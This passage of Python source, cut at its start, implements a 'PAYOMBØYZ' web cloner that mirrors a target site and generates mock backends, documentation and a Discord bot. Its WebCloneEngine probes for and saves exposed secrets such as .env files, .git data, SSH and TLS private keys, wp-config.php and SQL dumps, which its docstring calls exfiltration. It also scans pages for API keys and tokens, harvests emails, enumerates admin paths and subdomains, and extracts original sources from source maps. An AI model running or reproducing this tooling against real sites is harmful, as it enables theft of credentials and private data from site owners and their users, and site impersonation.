app = FastAPI(title="PAYOMBØYZ Reconstructed Backend - {domain}", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

{"".join(routes)}

if os.path.exists("../index.html"):
    app.mount("/", StaticFiles(directory="..", html=True), name="static")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8080, reload=True)
'''
        (base_dir / "main.py").write_text(main_py, encoding="utf-8")
        (base_dir / "start.bat").write_text("@echo off\npip install -r requirements.txt\npython main.py\npause\n", encoding="utf-8")

    @classmethod
    def _generate_turnkey_root_server(cls, session_folder: Path, domain: str, contracts: List[ApiEndpointContract]):
        """Generates lightweight root server.py and start.bat for instant 1-click preview without extra dependencies."""
        api_list = [c.path for c in contracts]
        api_endpoints_repr = json.dumps(api_list, indent=4)

        server_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  ⚡ PAYOMBØYZ LIVE OFFLINE PREVIEW SERVER & API INTERCEPTOR
  Target Domain: {domain}
  Auto-generated by PAYOMBØYZ Cyber Web Cloner Engine
================================================================================
"""

import os
import sys
import json
import time
import webbrowser
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse

PORT = 8080
DISCOVERED_APIS = {api_endpoints_repr}

class PayomboyzMirrorHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE, PATCH")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path.startswith("/api/") or path in DISCOVERED_APIS:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            resp = {{
                "success": True,
                "status": "ok",
                "mirrored_by": "PAYOMBØYZ",
                "endpoint": path,
                "timestamp": int(time.time()),
                "data": {{
                    "message": "PAYOMBØYZ dynamic API mock responding successfully",
                    "domain": "{domain}"
                }}
            }}
            self.wfile.write(json.dumps(resp, indent=2).encode("utf-8"))
            return

        return super().do_GET()

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace") if content_length > 0 else ""

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        resp = {{
            "success": True,
            "status": "processed",
            "endpoint": path,
            "payload_received": body[:200],
            "timestamp": int(time.time()),
            "message": "PAYOMBØYZ Offline Mock API Processed Successfully"
        }}
        self.wfile.write(json.dumps(resp, indent=2).encode("utf-8"))

    def do_PUT(self):
        self.do_POST()

    def do_DELETE(self):
        self.do_POST()

def run_server():
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    print("=" * 70)
    print("  ⚡ PAYOMBØYZ TURNKEY WEB MIRROR & BACKEND RUNNING")
    print(f"  🌐 Local Browser URL: http://localhost:{{PORT}}")
    print(f"  ⚙️ Dynamic Mock APIs: {{len(DISCOVERED_APIS)}} endpoints wired")
    print("=" * 70)
    try:
        webbrowser.open(f"http://localhost:{{PORT}}")
    except Exception:
        pass
    with HTTPServer(("", PORT), PayomboyzMirrorHandler) as httpd:
        httpd.serve_forever()

if __name__ == "__main__":
    run_server()
'''
        (session_folder / "server.py").write_text(server_code, encoding="utf-8")

        bat_code = (
            "@echo off\n"
            f"title PAYOMBØYZ Turnkey Web Mirror - {domain}\n"
            "echo Starting local mirror on http://localhost:8080 ...\n"
            "python server.py\n"
            "pause\n"
        )
        (session_folder / "start.bat").write_text(bat_code, encoding="utf-8")


# ========================================================================================
# 4. ARCHITECTURE & SPECIFICATION SPEC GENERATOR (ARCHITECTURE.md, openapi.yaml, docker-compose)
# ========================================================================================

class ArchitectureSpecGenerator:
    """
    Synthesizes comprehensive system architecture blueprints:
    - ARCHITECTURE.md (Mermaid topology, tech stack analysis, component tree, API contracts)
    - openapi.yaml (OpenAPI 3.0.3 specification)
    - docker-compose.yml (Multi-container production configuration)
    - README.md (Execution and developer onboarding guide)
    """

    @classmethod
    def generate_all(
        cls,
        session_folder: Path,
        domain: str,
        target_url: str,
        tech_stack: TechStackReport,
        contracts: List[ApiEndpointContract],
        downloaded_count: int,
        harvested_sources: int,
        security_findings: List[Dict[str, Any]],
        discovered_routes: Optional[Set[str]] = None
    ):
        cls._build_architecture_md(session_folder, domain, target_url, tech_stack, contracts, downloaded_count, harvested_sources, discovered_routes)
        cls._build_openapi_yaml(session_folder, domain, contracts)
        cls._build_docker_compose(session_folder, domain, tech_stack)
        cls._build_readme_md(session_folder, domain, tech_stack, contracts)

    @classmethod
    def _build_architecture_md(
        cls,
        session_folder: Path,
        domain: str,
        target_url: str,
        tech_stack: TechStackReport,
        contracts: List[ApiEndpointContract],
        downloaded_count: int,
        harvested_sources: int,
        discovered_routes: Optional[Set[str]] = None
    ):
        evidence_list = "\n".join([f"- {e}" for e in tech_stack.evidence]) or "- Standard HTTP probe heuristics"

        api_rows = []
        for c in contracts[:25]:
            api_rows.append(f"| `{c.method}` | `{c.path}` | `{c.request_dto_name}` | `{c.response_dto_name}` | {c.summary} |")
        api_table = "\n".join(api_rows) if api_rows else "| GET | `/api/status` | `GenericRequest` | `GenericResponse` | Default health endpoint |"

        routes_section = ""
        if discovered_routes:
            r_rows = []
            for r in sorted(list(discovered_routes)):
                slug = "index" if r == "/" else re.sub(r'[^a-zA-Z0-9_\-]', '_', r.strip('/'))
                offline_file = "index.html" if r == "/" else f"html/{slug}.html"
                r_rows.append(f"| `{r}` | [{offline_file}]({offline_file}) | SPA Pre-rendered DOM & CSS |")
            joined_r_rows = "\n".join(r_rows)
            routes_section = f"""
---

## 3. Discovered Multi-Page Routes & Page Catalog

| Route Path | Offline File Link | Capture Type |
|---|---|---|
{joined_r_rows}
"""

        arch_md = f"""# System Architecture & Reverse Engineering Specification
**Target Domain:** `{domain}`  
**Origin URL:** `{target_url}`  
**Analyzed & Reconstructed by:** PAYOMBØYZ Cyber Cloner Engine

---

## 1. System Topology Overview

```mermaid
flowchart TD
    subgraph ClientLayer["Frontend Client Layer"]
        Browser["User Browser / Client"]
        Interceptor["API Interceptor (js/api.js)"]
    end

    subgraph GatewayLayer["Perimeter & Proxy Layer"]
        Proxy["Reverse Proxy / Nginx Gateway"]
    end

    subgraph BackendLayer["Reconstructed Native Backend ({tech_stack.backend_framework})"]
        Controller["ApiController (@RestController / Express)"]
        Service["MockBusinessService (State Engine)"]
        MemoryDB[("In-Memory State Store / Cache")]
    end

    Browser --> Interceptor
    Interceptor --> GatewayLayer
    GatewayLayer --> Controller
    Controller --> Service
    Service --> MemoryDB
```

---

## 2. Tech Stack Forensic Analysis

| Component | Detected Technology | Confidence | Evidence |
|---|---|---|---|
| **Backend Runtime** | `{tech_stack.backend_framework}` | `{int(tech_stack.confidence * 100)}%` | Verified via HTTP headers, cookies & 404 response signatures |
| **Frontend UI** | `{tech_stack.frontend_framework}` | `95%` | DOM structure, script manifests, AST analysis |
| **Build Descriptor** | `{tech_stack.build_tool}` | `100%` | Auto-synthesized idiomatic project layout |
| **Assets Localized** | `{downloaded_count:,} files` | `100%` | Complete HTML, CSS, JS, fonts, images tree |
| **Original Sources** | `{harvested_sources:,} TypeScript/JSX files` | `100%` | Extracted from production Source Maps |

### Forensic Evidence Trail:
{evidence_list}
{routes_section}
---

## 4. Reconstructed API Catalog & Contracts

| Method | Endpoint Path | Request DTO | Response DTO | Purpose & Description |
|---|---|---|---|---|
{api_table}

---

## 5. Reconstructed Native Project Layout

```
{domain}_cloned/
├── index.html                   # Localized root entry point
├── ARCHITECTURE.md              # System Architecture & Forensic Specs
├── openapi.yaml                 # Complete OpenAPI 3.0.3 Contract
├── docker-compose.yml           # Multi-container orchestration
├── server.py & start.bat        # Lightweight 1-click preview server
├── html/                        # HTML sub-views
├── css/                         # Localized stylesheet assets
├── js/                          # Client JavaScript bundles & api.js
├── images/                      # Media and graphic assets
├── fonts/                       # Localized webfonts (woff2/ttf)
├── reconstructed_sources/       # Reconstructed TypeScript / JSX from Source Maps
└── backend-{tech_stack.backend_tech}/        # Native {tech_stack.backend_framework} project
    ├── pom.xml / package.json   # Native build file
    ├── Dockerfile               # Production container definition
    ├── start.bat & start.sh     # 1-click native launcher
    └── src/                     # Controllers, DTOs, and Services
```
"""
        (session_folder / "ARCHITECTURE.md").write_text(arch_md, encoding="utf-8")

    @classmethod
    def _build_openapi_yaml(cls, session_folder: Path, domain: str, contracts: List[ApiEndpointContract]):
        yaml_lines = [
            "openapi: 3.0.3",
            "info:",
            f"  title: PAYOMBØYZ Mirrored API — {domain}",
            "  version: 1.0.0",
            f"  description: Reverse engineered OpenAPI specification for {domain}",
            "servers:",
            "  - url: http://localhost:8080",
            "    description: Local Reconstructed Backend",
            "paths:"
        ]

        for c in contracts[:30]:
            clean_p = c.path.split("?")[0]
            yaml_lines.append(f"  {clean_p}:")
            yaml_lines.append(f"    {c.method.lower()}:")
            yaml_lines.append(f"      summary: {c.summary}")
            yaml_lines.append("      responses:")
            yaml_lines.append("        '200':")
            yaml_lines.append("          description: Successful execution")
            yaml_lines.append("          content:")
            yaml_lines.append("            application/json:")
            yaml_lines.append("              schema:")
            yaml_lines.append("                type: object")

        (session_folder / "openapi.yaml").write_text("\n".join(yaml_lines), encoding="utf-8")

    @classmethod
    def _build_docker_compose(cls, session_folder: Path, domain: str, tech_stack: TechStackReport):
        backend_dir = f"./backend-{tech_stack.backend_tech}"
        compose_yaml = f"""version: '3.8'

services:
  backend:
    build:
      context: {backend_dir}
      dockerfile: Dockerfile
    container_name: payomboyz-backend-{domain.replace('.', '-')}
    ports:
      - "8080:8080"
    environment:
      - PORT=8080
      - ENVIRONMENT=production
    restart: unless-stopped

  frontend:
    image: nginx:alpine
    container_name: payomboyz-frontend-{domain.replace('.', '-')}
    ports:
      - "80:80"
    volumes:
      - ./:/usr/share/nginx/html:ro
    depends_on:
      - backend
    restart: unless-stopped
"""
        (session_folder / "docker-compose.yml").write_text(compose_yaml, encoding="utf-8")

    @classmethod
    def _build_readme_md(cls, session_folder: Path, domain: str, tech_stack: TechStackReport, contracts: List[ApiEndpointContract]):
        readme = f"""# PAYOMBØYZ Beast-Grade Cloned Site: {domain}

Auto-generated by **PAYOMBØYZ Cyber Web Cloner Engine**.

## 🚀 Quick Start Instructions

### Option 1: Instant Zero-Dependency Preview (Recommended for Quick Check)
Simply double-click `start.bat` in the root folder, or run:
```bash
python server.py
```
This opens `http://localhost:8080` in your default browser with all frontend assets and dynamic mock APIs active.

### Option 2: Run the Native Reconstructed Backend ({tech_stack.backend_framework})
A full, native project matching the detected stack has been created under `backend-{tech_stack.backend_tech}/`:
"""
        if tech_stack.backend_tech == "java":
            readme += """
```bash
cd backend-java
mvn spring-boot:run
# Or simply double-click backend-java/start.bat
```
"""
        elif tech_stack.backend_tech == "nodejs":
            readme += """
```bash
cd backend-node
npm install
npm start
```
"""
        else:
            readme += f"""
```bash
cd backend-{tech_stack.backend_tech}
start.bat
```
"""
        readme += """
### Option 3: Full-Stack Docker Deployment
```bash
docker-compose up --build
```
"""
        (session_folder / "README.md").write_text(readme, encoding="utf-8")


# ========================================================================================
# 5. CORE WEB CLONING ENGINE & PIPELINE
# ========================================================================================

class WebCloneEngine:
    """
    Industrial-grade web cloner and security reconnaissance pipeline.
    Preserves complete asset trees, exfiltrates sensitive files, generates native backends,
    and produces turnkey architecture specifications.
    """

    COMMON_SUBDOMAINS = ["api", "admin", "dev", "app", "auth", "cdn", "dashboard", "portal", "staging", "v1"]

    COMMON_ADMIN_PATHS = [
        "/admin", "/admin/login", "/login", "/signin", "/dashboard",
        "/cpanel", "/wp-admin", "/portal", "/api/docs", "/swagger", "/docs"
    ]

    SENSITIVE_PROBES = [
        (".env", "hidden__dot_env"),
        (".env.local", "hidden__dot_env_dot_local"),
        (".env.production", "hidden__dot_env_dot_production"),
        (".env.backup", "hidden__dot_env_dot_backup"),
        (".env.staging", "hidden__dot_env_dot_staging"),
        (".git/HEAD", "git_HEAD"),
        (".git/config", "git_config"),
        (".git/index", "git_index"),
        (".git/COMMIT_EDITMSG", "git_COMMIT_EDITMSG"),
        (".git/logs/HEAD", "git_logs_HEAD"),
        (".git/refs/heads/main", "git_refs_heads_main"),
        (".git/refs/heads/master", "git_refs_heads_master"),
        ("backup.sql", "hidden_backup_dot_sql"),
        ("database.sql", "hidden_database_dot_sql"),
        ("db.sql", "hidden_db_dot_sql"),
        ("dump.sql", "hidden_dump_dot_sql"),
        ("config.php", "hidden_config_dot_php"),
        ("config.json", "hidden_config_dot_json"),
        ("config.yaml", "hidden_config_dot_yaml"),
        ("config.yml", "hidden_config_dot_yml"),
        ("wp-config.php", "hidden_wp-config_dot_php"),
        ("web.config", "hidden_web_dot_config"),
        ("id_rsa", "hidden_id_rsa"),
        ("id_rsa.pub", "hidden_id_rsa_dot_pub"),
        ("private.pem", "hidden_private_dot_pem"),
        ("server.key", "hidden_server_dot_key"),
        ("composer.json", "hidden_composer_dot_json"),
        ("docker-compose.yml", "hidden_docker-compose_dot_yml"),
        ("package.json", "hidden_package_dot_json"),
        ("Dockerfile", "hidden_Dockerfile"),
        ("robots.txt", "robots.txt"),
        ("sitemap.xml", "sitemap.xml"),
        ("sitemap_index.xml", "sitemap_index.xml"),
        ("security.txt", "security.txt"),
        (".well-known/security.txt", "security.txt"),
        (".htaccess", "hidden__dot_htaccess"),
        ("swagger.json", "swagger.json"),
        ("openapi.json", "openapi.json"),
        ("api/swagger.json", "api_swagger.json")
    ]

    def __init__(self, mode: str = "Deep"):
        self.mode = mode
        self.session = None
        self._init_session()
        self.downloaded_urls: Set[str] = set()
        self.discovered_apis: Set[str] = set()
        self.discovered_secrets: List[Dict[str, str]] = []
        self.decoded_jwts: List[Dict[str, Any]] = []
        self.forms_dumped: List[Dict[str, Any]] = []
        self.contacts_harvested: Set[str] = set()
        self.security_findings: List[Dict[str, Any]] = []
        self.subdomains_alive: List[str] = []
        self.admin_paths_found: List[str] = []
        self.exfiltrated_files: List[str] = []
        self.harvested_source_files: int = 0
        self.is_spa_hydrated: bool = False
        self.raw_server_headers: Dict[str, str] = {}
        self.all_crawled_urls: Set[str] = set()
        self.url_asset_mapping: Dict[str, str] = {}
        self.js_snippets_collected: List[str] = []
        self.all_runtime_styles: List[str] = []
        self.discovered_routes: Set[str] = {"/"}
        self.multi_page_results: Dict[str, str] = {}

    def _init_session(self):
        if HAS_CURL_CFFI:
            self.session = cffi_requests.Session(impersonate="chrome124")
        else:
            import requests
            self.session = requests.Session()
            self.session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            })

    def _crawl_multi_page_routes(
        self,
        target_url: str,
        routes: Set[str],
        session_folder: Path,
        custom_cookies: Optional[str] = None
    ) -> Dict[str, str]:
        """
        Crawls discovered SPA routes using Headless Chrome, extracts runtime <style> tags,
        active CSS rules, and captures post-hydration HTML for each page.
        """
        pages_html: Dict[str, str] = {}
        css_pages_dir = session_folder / "css" / "pages"
        html_dir = session_folder / "html"
        css_pages_dir.mkdir(parents=True, exist_ok=True)
        html_dir.mkdir(parents=True, exist_ok=True)

        sorted_routes = sorted(list(routes), key=lambda r: (0 if r == "/" else 1, len(r)))
        target_routes = sorted_routes[:15]

        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as p:
                browser = None
                try:
                    browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage", "--disable-setuid-sandbox"])
                except Exception:
                    try:
                        browser = p.chromium.launch(channel="chrome", headless=True, args=["--no-sandbox", "--disable-gpu"])
                    except Exception:
                        pass
                if not browser:
                    return pages_html

                context = browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
                )
                if custom_cookies:
                    cookie_list = []
                    parsed_u = urllib.parse.urlparse(target_url)
                    for item in custom_cookies.split(";"):
                        if "=" in item:
                            k, v = item.strip().split("=", 1)
                            cookie_list.append({"name": k, "value": v, "domain": parsed_u.netloc, "path": "/"})
                    if cookie_list:
                        context.add_cookies(cookie_list)

                page = context.new_page()

                for r_path in target_routes:
                    page_u = urllib.parse.urljoin(target_url, r_path)
                    slug = "index" if r_path == "/" else re.sub(r'[^a-zA-Z0-9_\-]', '_', r_path.strip('/'))
                    if not slug:
                        slug = "page"

                    try:
                        print(f"  [Crawler] Hydrating route: {r_path} -> {page_u}")
                        page.goto(page_u, wait_until="domcontentloaded", timeout=12000)
                        page.wait_for_timeout(1500)

                        content = page.content()
                        if content:
                            pages_html[r_path] = content
                            self.is_spa_hydrated = True

                        runtime_css = ComputedStyleAggregator.harvest_from_page(page)
                        if runtime_css and len(runtime_css.strip()) > 20:
                            (css_pages_dir / f"{slug}.css").write_text(runtime_css, encoding="utf-8")
                            self.all_runtime_styles.append(f"/* Route: {r_path} ({slug}.css) */\n" + runtime_css)

                    except Exception as e:
                        print(f"  [!] Failed to hydrate {r_path}: {e}")

                browser.close()
        except Exception as e:
            print(f"[!] Playwright multi-page crawler error: {e}")

        # Fallback for routes that were not hydrated by Playwright
        for r_path in target_routes:
            if r_path not in pages_html:
                page_u = urllib.parse.urljoin(target_url, r_path)
                data, _, stat, _ = self._fetch(page_u, timeout=6)
                if data and stat == 200:
                    pages_html[r_path] = data.decode("utf-8", errors="replace")

        return pages_html

    def _fetch_hydrated_dom(self, url: str, custom_cookies: Optional[str] = None, timeout_ms: int = 15000) -> Optional[str]:
        res_map = self._crawl_multi_page_routes(url, {"/"}, Path("."), custom_cookies=custom_cookies)
        return res_map.get("/", None)

    def _fetch(self, url: str, headers: Optional[Dict[str, str]] = None, timeout: int = 12) -> Tuple[Optional[bytes], str, int, Dict[str, str]]:
        req_headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
        }
        if headers:
            req_headers.update(headers)

        try:
            resp = self.session.get(url, headers=req_headers, timeout=timeout, allow_redirects=True)
            content_type = resp.headers.get("Content-Type", "")
            return resp.content, content_type, resp.status_code, dict(resp.headers)
        except Exception as e:
            return None, str(e), 500, {}

    def _decode_jwt_token(self, token: str) -> Optional[Dict[str, Any]]:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        try:
            payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
            payload_json = base64.urlsafe_b64decode(payload_b64.encode("utf-8")).decode("utf-8", errors="ignore")
            return json.loads(payload_json)
        except Exception:
            return None

    def _scan_secrets_and_apis(self, text: str, source_label: str):
        patterns = {
            "JWT_Token": r'\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b',
            "Google_API_Key": r'AIza[0-9A-Za-z-_]{35}',
            "AWS_Access_Key": r'AKIA[0-9A-Z]{16}',
            "Stripe_Key": r'(?:pk|sk)_(?:live|test)_[0-9a-zA-Z]{24,}',
            "Generic_Secret": r'(?:api_key|apikey|secret|token|auth_token)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
            "Firebase_URL": r'https://[a-zA-Z0-9_\-]+\.firebaseio\.com',
        }

        for sec_type, pat in patterns.items():
            matches = re.findall(pat, text, re.IGNORECASE)
            for m in matches:
                val = m if isinstance(m, str) else m[0]
                if sec_type == "JWT_Token":
                    decoded = self._decode_jwt_token(val)
                    if decoded and decoded not in [d["payload"] for d in self.decoded_jwts]:
                        self.decoded_jwts.append({
                            "source": source_label,
                            "raw": val[:30] + "...",
                            "payload": decoded
                        })
                entry = {"type": sec_type, "snippet": val[:40] + "...", "source": source_label}
                if entry not in self.discovered_secrets:
                    self.discovered_secrets.append(entry)

        # Scrape REST / GraphQL Endpoints
        api_matches = re.findall(r'["\'](/(?:api|v[1-9]|graphql|auth|user|admin|checkout|bypass|link|search|scripts)/[^"\'\s>]+)["\']', text)
        for api in api_matches:
            if not api.endswith((".js", ".css", ".png", ".jpg", ".svg", ".woff2")):
                self.discovered_apis.add(api)

        # Scrape Emails
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b', text)
        for e in emails:
            if not e.endswith((".png", ".jpg", ".webp", ".svg")):
                self.contacts_harvested.add(e)

    def _extract_assets(self, html_text: str, base_url: str) -> List[str]:
        assets = []
        if HAS_BS4:
            soup = BeautifulSoup(html_text, "html.parser")
            for tag in soup.find_all("link", href=True):
                rel = tag.get("rel", [])
                if any(r in rel for r in ["stylesheet", "icon", "shortcut icon", "preload", "manifest"]):
                    assets.append(urllib.parse.urljoin(base_url, tag["href"]))

            for tag in soup.find_all("script", src=True):
                assets.append(urllib.parse.urljoin(base_url, tag["src"]))

            for tag in soup.find_all(["img", "video", "audio", "source"], src=True):
                assets.append(urllib.parse.urljoin(base_url, tag["src"]))

            for tag in soup.find_all("img", srcset=True):
                for item in tag["srcset"].split(","):
                    p = item.strip().split(" ")[0]
                    if p:
                        assets.append(urllib.parse.urljoin(base_url, p))

            for a_tag in soup.find_all("a", href=True):
                href = a_tag["href"].strip()
                if href and not href.startswith(("javascript:", "mailto:", "tel:", "#")):
                    self.all_crawled_urls.add(urllib.parse.urljoin(base_url, href))
        else:
            tags = re.findall(r'<(?:link|script|img|source)[^>]+(?:href|src)=["\']([^"\']+)["\']', html_text, re.IGNORECASE)
            for t in tags:
                assets.append(urllib.parse.urljoin(base_url, t))
            anchors = re.findall(r'<a[^>]+href=["\']([^"\']+)["\']', html_text, re.IGNORECASE)
            for a in anchors:
                if not a.startswith(("javascript:", "mailto:", "tel:", "#")):
                    self.all_crawled_urls.add(urllib.parse.urljoin(base_url, a))

        next_chunks = re.findall(r'["\'](/_next/static/[^"\'\s>]+)["\']', html_text)
        for nc in next_chunks:
            assets.append(urllib.parse.urljoin(base_url, nc))

        css_urls = re.findall(r'url\(["\']?([^)"\']+)["\']?\)', html_text, re.IGNORECASE)
        for cu in css_urls:
            if not cu.startswith("data:"):
                assets.append(urllib.parse.urljoin(base_url, cu))

        clean_assets = []
        for a in assets:
            clean = a.split("#")[0].strip()
            if clean and not clean.startswith("data:") and clean not in clean_assets:
                clean_assets.append(clean)
        return clean_assets

    def _extract_forms(self, html_text: str):
        if HAS_BS4:
            soup = BeautifulSoup(html_text, "html.parser")
            for f in soup.find_all("form"):
                action = f.get("action", "self")
                method = f.get("method", "GET").upper()
                inputs = [inp.get("name") for inp in f.find_all("input") if inp.get("name")]
                self.forms_dumped.append({
                    "action": action,
                    "method": method,
                    "fields": inputs
                })
        else:
            form_matches = re.findall(r'<form[^>]*>(.*?)</form>', html_text, re.IGNORECASE | re.DOTALL)
            for f in form_matches:
                inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', f, re.IGNORECASE)
                action_m = re.search(r'action=["\']([^"\']+)["\']', f, re.IGNORECASE)
                self.forms_dumped.append({
                    "action": action_m.group(1) if action_m else "self",
                    "method": "FORM",
                    "fields": inputs
                })

    def _harvest_source_maps(self, js_url: str, js_text: str, session_folder: Path):
        map_url = None
        m = re.search(r'//#\s*sourceMappingURL=(\S+)', js_text)
        if m:
            map_target = m.group(1).strip()
            if not map_target.startswith("data:"):
                map_url = urllib.parse.urljoin(js_url, map_target)
        else:
            map_url = js_url + ".map"

        if not map_url:
            return

        map_data, _, status, _ = self._fetch(map_url, timeout=6)
        if map_data and status == 200 and len(map_data) > 100:
            try:
                map_json = json.loads(map_data.decode("utf-8", errors="replace"))
                sources = map_json.get("sources", [])
                sources_content = map_json.get("sourcesContent", [])
                if sources and sources_content and len(sources) == len(sources_content):
                    src_out = session_folder / "reconstructed_sources"
                    src_out.mkdir(parents=True, exist_ok=True)
                    for s_path, s_code in zip(sources, sources_content):
                        if s_code and len(s_code.strip()) > 10:
                            clean_rel = re.sub(r'^[a-zA-Z0-9_\-\.]+://', '', s_path).lstrip("/").replace("..", "_")
                            out_file = src_out / clean_rel
                            out_file.parent.mkdir(parents=True, exist_ok=True)
                            out_file.write_text(s_code, encoding="utf-8", errors="replace")
                            self.harvested_source_files += 1
            except Exception:
                pass

    def _probe_subdomains(self, base_domain: str):
        domain_parts = base_domain.split(".")
        if len(domain_parts) < 2:
            return
        root_domain = ".".join(domain_parts[-2:])

        def _check_sub(sub: str):
            sub_url = f"https://{sub}.{root_domain}"
            data, _, code, _ = self._fetch(sub_url, timeout=3)
            if code in (200, 301, 302, 401, 403):
                return f"{sub}.{root_domain} (Status {code})"
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            results = pool.map(_check_sub, self.COMMON_SUBDOMAINS)
            for res in results:
                if res:
                    self.subdomains_alive.append(res)

    def _probe_admin_paths(self, target_url: str):
        def _check_admin(path: str):
            full_u = urllib.parse.urljoin(target_url, path)
            data, _, code, _ = self._fetch(full_u, timeout=3)
            if code in (200, 301, 302, 401, 403):
                return f"[HTTP {code}] {path} -> {full_u}"
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            results = pool.map(_check_admin, self.COMMON_ADMIN_PATHS)
            for res in results:
                if res:
                    self.admin_paths_found.append(res)

    def _probe_and_exfiltrate_sensitive_files(self, target_url: str, session_folder: Path):
        def _check_sensitive(item: Tuple[str, str]):
            remote_path, local_save_name = item
            test_u = urllib.parse.urljoin(target_url, remote_path)
            data, _, status, headers = self._fetch(test_u, timeout=4)
            if data and status == 200 and 0 < len(data) < 1000000:
                snippet = data.decode("utf-8", errors="replace")[:120].strip()
                if "git" not in remote_path and snippet.lower().startswith(("<!doctype html", "<html")):
                    return None

                target_file = session_folder / local_save_name
                target_file.write_bytes(data)
                self.exfiltrated_files.append(f"[FILE] {remote_path}")
                return {
                    "path": remote_path,
                    "save_as": local_save_name,
                    "status": status,
                    "size": len(data),
                    "snippet": snippet
                }
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            results = pool.map(_check_sensitive, self.SENSITIVE_PROBES)
            for res in results:
                if res:
                    self.security_findings.append(res)

    def _extract_nextjs_data(self, html_text: str, session_folder: Path):
        m = re.search(r'<script id="__NEXT_DATA__" type="application/json">\s*({.*?})\s*</script>', html_text, re.DOTALL)
        if m:
            try:
                next_json = json.loads(m.group(1))
                (session_folder / "next_data.json").write_text(json.dumps(next_json, indent=2, ensure_ascii=False), encoding="utf-8")
                build_id = next_json.get("buildId", "")
                if build_id:
                    self.security_findings.append({
                        "path": "/_next/static/" + build_id,
                        "status": 200,
                        "size": len(m.group(1)),
                        "snippet": f"Next.js Build ID: {build_id}"
                    })
            except Exception:
                pass

    def _gather_network_ip_info(self, domain: str, session_folder: Path):
        ip_addr = "Unknown"
        try:
            ip_addr = socket.gethostbyname(domain)
        except Exception:
            pass
        (session_folder / "ip_info.txt").write_text(f"{domain} -> {ip_addr}\n", encoding="utf-8")

    def _create_turnkey_discord_bot(self, session_folder: Path, domain: str):
        bot_dir = session_folder / "discord_bot"
        bot_cogs = bot_dir / "cogs"
        bot_utils = bot_dir / "utils"
        bot_cogs.mkdir(parents=True, exist_ok=True)
        bot_utils.mkdir(parents=True, exist_ok=True)

        bot_main = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import asyncio
import discord
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("DISCORD_BOT_TOKEN", "")
PREFIX = os.getenv("COMMAND_PREFIX", "!")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f"[+] {{bot.user}} Logged in successfully! Mirror Bot for {domain}")
    try:
        synced = await bot.tree.sync()
        print(f"[+] Synced {{len(synced)}} slash commands.")
    except Exception as e:
        print(f"[-] Slash sync failed: {{e}}")

@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"🏓 Pong! Latency: `{{round(bot.latency * 1000)}}ms`")

async def main():
    async with bot:
        for cog_file in [f for f in os.listdir("cogs") if f.endswith(".py") and not f.startswith("__")]:
            await bot.load_extension(f"cogs.{{cog_file[:-3]}}")
        await bot.start(TOKEN)

if __name__ == "__main__":
    if not TOKEN:
        print("[!] Please set DISCORD_BOT_TOKEN in .env")
        sys.exit(1)
    asyncio.run(main())
'''
        (bot_dir / "main.py").write_text(bot_main, encoding="utf-8")

        bot_cog = f'''import discord
from discord.ext import commands
from discord import app_commands

class MirrorServiceCog(commands.Cog):
    """Commands wrapping the mirrored services of {domain}"""
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="status", description="Check {domain} mirror service status")
    async def status_cmd(self, interaction: discord.Interaction):
        embed = discord.Embed(
            title="⚡ {domain} Service Status",
            description="All service endpoints and proxy bypasses are operating normally.",
            color=0x00E696
        )
        embed.add_field(name="🌐 Target", value="`https://{domain}`", inline=True)
        embed.add_field(name="🛡️ Engine", value="PAYOMBØYZ Beast-Grade Cloner", inline=True)
        await interaction.response.send_message(embed=embed)

async def setup(bot):
    await bot.add_cog(MirrorServiceCog(bot))
'''
        (bot_cogs / "mirror_service.py").write_text(bot_cog, encoding="utf-8")
